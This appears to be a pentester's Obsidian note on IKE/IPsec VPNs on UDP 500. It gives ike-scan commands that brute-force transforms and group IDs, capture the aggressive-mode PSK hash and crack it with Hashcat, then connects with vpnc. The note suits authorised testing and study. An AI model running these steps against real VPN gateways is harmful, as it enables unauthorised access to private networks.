```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
*Internet Security Association and Key Management Protocol* (ISAKMP) is a framework for managing message formats and procedures for establishing Security Associations (SAs) and managing cryptographic keys between two hosts on an IP Network, particularly for IPsec VPNs (LAN-to-LAN) and remote users to a network gateway.

**Standard Port:** 
- 500/udp

[Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html?highlight=500/udp#500udp---pentesting-ipsecike-vpn)
## How it works
First the establishment of the *Security Association* (SA) between two points managed by IKE:
1. A secure channel is created between two endpoints using either a Pre-Shared Key (`PSK`) or certificates, using either Main mode (which uses three pairs of messages) or Aggressive mode.
2. Although not mandatory, Extended Authentication Phase is when the identify of the user attempting to connect is verified by username and password.
3. Negotiation of parameters for securing data with ESP and AH happens next. It allows for using different algorithms to the first phase, ensuring *Perfect Forward Secrecy* (*PFS*)
![[Pasted image 20251007163020.png]]
## Enumeration Checklist
### Identify valid transformations
IPSec can be configured to only accept one or a few transformations (these are combinations of values). Each transformation contains a number of attributes like:
- Encryption algorithm : eg. DES, 3DES
- Integrity algorithm : eg. SHA, MD5
- Authentication type : eg. Pre-Shared Key (PSK)
- Distribution algorithm : eg. Diffie-Hellman 1 or 2
- Lifetime : in seconds

First we need to find a valid transformation so we can talk with the server, we can use `ike-scan` to do this as it will send a single proposal with eight transformations inside:
```bash
ike-scan -M [ip]
```
```bash
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
    HDR=(CKY-R=d90bf054d6b76401)
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
    VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
> Some points to note here:
> - Auth is PSK (this is good for pentesting)
> - `1 returned handshake; 0 returned notify` means the target is configured for IPsec and is willing to perform IKE negotiation, and either one or more of the proposed transformations are acceptable (the valid transformation is shown in the output)
> - `0 returned handshake; 0 returned notify` means its not an IPsec gateway
> - `1 returned handshake; 1 returned notify` means none of the transformations were accepted (*Some VPN gateways won't do this annoyingly*), if this is the case we can [[#Brute force a valid transformation]]
#### Brute force a valid transformation
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Then brute-force each one using `ike-scan`:
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line [IP]) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
If we still can't find one, it may be that the server isn't responding without handshakes (even to valid transformations). Therefore, you can do the same brute-force but for aggressive mode:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
> You can also use [iker.py](https://github.com/isaudits/scripts/blob/master/iker.py) or [ikeforce](https://github.com/SpiderLabs/ikeforce) to do these attacks.

### Attempt to fingerprint the VPN provider
```bash
ike-scan -M --showbackoff [ip]
```
or with [[Nmap]] script `ike-version`

### Finding the correct ID (group name)
When doing an `ike-scan`, if Vendor IDs and XAUTH show up, we might be able to try aggressive mode to see if any service leaked identity or PSK material show up:
```bash
ike-scan -A -P psk.txt [ip]
```
> from here we may be able to get the ID

To be able to capture a hash we need to use the valid transformation supporting aggressive mode and the correct ID (group name). We will likely have to brute-force the group name.
```bash
ike-scan -P -M -A -n fakeID [ip]
```
> this method will only work if it DOES NOT send back a hash, if it does, then its likely creating a fake hash for our fake user so it won't be good for brute-forcing.

If no hash is returned from above, we can proceed with :
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
> We can also use the [dictionary of ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) or https://book.hacktricks.wiki/files/vpnIDs.txt which is a combination of both without duplicates

Alternatively, we can try:
- [iker.py](https://github.com/isaudits/scripts/blob/master/iker.py) which uses `ike-scan` but follows its own method to find a valid ID based on the output of ike-scan
- [ikeforce.py](https://github.com/SpiderLabs/ikeforce) which will try to use different exploits to distinguish between valid and non-valid IDs (can have false positives/negatives)

### Capturing the Hash
If we have a valid transformation and the group name and aggressive mode is enable, we can grab the hash:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the password
```
this can then be cracked as a normal hash with [[Hashcat]] mode - MD5 : 5300 - SHA1 : 5400

### Connecting to an IPSec VPN
In Kali, we use `VPNC` so we need this connection file in `/etc/vpnc/[filename].conf`
```
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk 
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
```
Then we can use:
```bash
vpnc [filename]
```
This will start it in the background and connect us to the VPN.